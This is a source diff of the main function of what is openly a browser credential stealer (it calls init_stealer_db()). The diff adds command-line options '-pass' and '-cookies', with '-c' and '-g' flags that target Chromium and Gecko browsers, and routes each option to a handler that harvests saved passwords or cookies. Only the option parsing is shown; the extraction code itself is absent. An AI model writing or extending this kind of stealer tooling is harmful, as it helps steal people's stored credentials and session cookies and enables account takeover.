@@ -51,18 +51,59 @@ int main(int argc, char* argv[])
 	init_stealer_db();
 	Visualizer visualizer(converted_username, stealer_db);
 
-	if (argc > 1)
-	{
-		if (std::string(argv[1]) == "--help")
-		{
-			//Visualize here
-			visualizer.visualization_main();
-		}
-	}
-	else
-	{
-		if (!visualizer.default_settings(converted_username, stealer_db))
-			return -1;
-	}
+    if (argc == 1) {
+        if (!visualizer.default_settings(converted_username, stealer_db))
+            return -1;
+    }
+    else if (std::string(argv[1]) == "-console-mode") {
+        // Console mode visualization
+        visualizer.visualization_main();
+    }
+    else if (std::string(argv[1]) == "-h") {
+        visualizer.displayHelp();
+    }
+    else if (std::string(argv[1]) == "-pass") {
+        // Handle -pass options
+        if (argc > 2) {
+            if (std::string(argv[2]) == "-c") {
+                std::cout << "Target Chromium Browser passwords...\n";
+                visualizer.handler(1);
+            }
+            else if (std::string(argv[2]) == "-g") {
+                std::cout << "Target Gecko Browser passwords...\n";
+                visualizer.handler(2);
+            }
+            else {
+                std::cout << "Invalid option for -pass. Use -h for help.\n";
+            }
+        }
+        else {
+            std::cout << "Target all browser passwords...\n";
+            visualizer.handler(3);
+        }
+    }
+    else if (std::string(argv[1]) == "-cookies") {
+        // Handle -cookies options
+        if (argc > 2) {
+            if (std::string(argv[2]) == "-c") {
+                std::cout << "Target Chromium Browser cookies...\n";
+                visualizer.handler(4);
+            }
+            else if (std::string(argv[2]) == "-g") {
+                std::cout << "Target Gecko Browser cookies...\n";
+                visualizer.handler(5);
+            }
+            else {
+                std::cout << "Invalid option for -cookies. Use -h for help.\n";
+            }
+        }
+        else {
+            std::cout << "Target all browser cookies...\n";
+            visualizer.handler(6);
+        }
+    }
+    else {
+        std::cout << "Invalid parameter. Use -h for help.\n";
+    }
 	return 0;
 }
